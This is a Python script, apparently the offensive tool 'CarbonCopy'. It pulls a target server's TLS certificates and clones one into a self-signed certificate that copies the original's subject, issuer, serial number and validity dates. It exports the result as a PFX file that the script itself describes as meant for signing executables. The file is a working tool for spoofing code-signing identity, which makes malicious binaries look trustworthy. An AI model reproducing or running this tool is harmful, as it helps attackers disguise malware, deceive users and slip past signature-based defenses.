#!/usr/bin/python3

from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
from subprocess import Popen, PIPE, DEVNULL
from argparse import ArgumentParser
import re
import shutil
import ssl
import os
import subprocess
import sys

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def CarbonCopy(host, port):

    try:
        # Fetching Details
        print("[+] Loading public key of %s in Memory..." % host)
        # No easy way to get CA from server using python...
        p1 = Popen(('openssl s_client -connect %s:%s -showcerts' % (host, port)).split(), stdout=PIPE, stdin=DEVNULL, stderr=DEVNULL)
        output = p1.communicate()[0]
        matches = re.findall('(-----BEGIN CERTIFICATE-----.+?-----END CERTIFICATE-----)', output.decode(sys.stdout.encoding), re.DOTALL)
        if len(matches) == 0:
            sys.exit('No certificate found')

        choice = 'n'
        print('Found %d certificate(s)' % len(matches))
        for match in matches:
            x509 = crypto.load_certificate(crypto.FILETYPE_PEM, match)
            print('Use this certificate (y/n) ? %s' % x509.get_subject())
            choice = input()
            if choice == 'y':
                break
        if choice != 'y':
            sys.exit()

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        # Creating Fake Certificate
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        # Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        # Setting Cert details from loaded from the original Certificate
        print("[+] Cloning Certificate Version")
        cert.set_version(x509.get_version())
        print("[+] Cloning Certificate Serial Number")
        cert.set_serial_number(x509.get_serial_number())
        print("[+] Cloning Certificate Subject")
        cert.set_subject(x509.get_subject())
        print("[+] Cloning Certificate Issuer")
        cert.set_issuer(x509.get_issuer())
        print("[+] Cloning Certificate Registration & Expiration Dates")
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        print("[+] Signing Keys")
        cert.sign(k, 'sha256')

        print("[+] Creating %s and %s" %(CNCRT, CNKEY))
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        print("[+] Clone process completed. Creating PFX file for signing executable...")

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))

def main():
    p = ArgumentParser()
    p.add_argument('host', action='store', help='Host to connect to')
    p.add_argument('-p', '--port', action='store', type=int, default=443, help='Port to connect to', required=False)

    o = p.parse_args()
    CarbonCopy(o.host, o.port)

if __name__ == "__main__":
    main()
